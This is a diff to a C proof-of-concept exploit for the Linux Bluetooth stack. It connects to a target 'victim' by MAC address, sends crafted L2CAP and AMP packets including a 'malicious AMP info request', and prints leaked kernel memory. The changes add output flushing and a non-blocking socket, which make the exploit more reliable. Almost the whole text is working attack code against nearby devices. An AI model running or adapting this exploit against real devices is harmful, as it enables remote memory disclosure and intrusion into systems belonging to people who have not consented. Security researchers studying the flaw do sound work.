@@ -6,6 +6,9 @@
 #include <bluetooth/l2cap.h>
 #include <bluetooth/hci.h>
 #include <bluetooth/hci_lib.h>
+#include <stdio.h>
+#include <errno.h>
+#include <fcntl.h>
 
 #define AMP_MGR_CID 0x03
 
@@ -52,6 +55,12 @@ int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t 
   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
 }
 
+int make_socket_non_blocking(int sock) {
+  int flags = fcntl(sock, F_GETFL, 0);
+  if (flags == -1) return -1;
+  return fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+}
+
 int main(int argc, char **argv) {
   if (argc != 2) {
     printf("Usage: %s MAC_ADDR\n", argv[0]);
@@ -62,10 +71,12 @@ int main(int argc, char **argv) {
   str2ba(argv[1], &dst_addr);
 
   printf("[*] Resetting hci0 device...\n");
+  fflush(stdout);
   system("sudo hciconfig hci0 down");
   system("sudo hciconfig hci0 up");
 
   printf("[*] Opening hci device...\n");
+  fflush(stdout);
   struct hci_dev_info di;
   int hci_device_id = hci_get_route(NULL);
   int hci_socket = hci_open_dev(hci_device_id);
@@ -90,6 +101,7 @@ int main(int argc, char **argv) {
   }
 
   printf("[*] Connecting to victim...\n");
+  fflush(stdout);
 
   struct sockaddr_l2 laddr = {0};
   laddr.l2_family = AF_BLUETOOTH;
@@ -125,8 +137,10 @@ int main(int argc, char **argv) {
 
   uint16_t hci_handle = l2_conninfo.hci_handle;
   printf("[+] HCI handle: %x\n", hci_handle);
+  fflush(stdout);
 
   printf("[*] Creating AMP channel...\n");
+  fflush(stdout);
   struct {
     l2cap_hdr hdr;
   } packet1 = {0};
@@ -135,6 +149,7 @@ int main(int argc, char **argv) {
   hci_send_acl_data(hci_socket, hci_handle, &packet1, sizeof(packet1));
 
   printf("[*] Configuring to L2CAP_MODE_BASIC...\n");
+  fflush(stdout);
   struct {
     l2cap_hdr hdr;
     l2cap_cmd_hdr cmd_hdr;
@@ -156,6 +171,7 @@ int main(int argc, char **argv) {
   hci_send_acl_data(hci_socket, hci_handle, &packet2, sizeof(packet2));
 
   printf("[*] Sending malicious AMP info request...\n");
+  fflush(stdout);
   struct {
     l2cap_hdr hdr;
     amp_mgr_hdr amp_hdr;
@@ -169,6 +185,11 @@ int main(int argc, char **argv) {
   packet3.info_req.id = 0x42; // use a dummy id to make hci_dev_get fail
   hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));
 
+  if (make_socket_non_blocking(hci_socket) == -1) {
+    perror("Failed to set socket to non-blocking");
+    return -1;
+  }
+
   // Read responses
   for (int i = 0; i < 64; i++) {
     char buf[1024] = {0};
@@ -180,6 +201,7 @@ int main(int argc, char **argv) {
         uint64_t leak2 = *(uint64_t *)(buf + 21);
         uint16_t leak3 = *(uint64_t *)(buf + 29);
         printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
+        fflush(stdout);
         break;
       }
     }
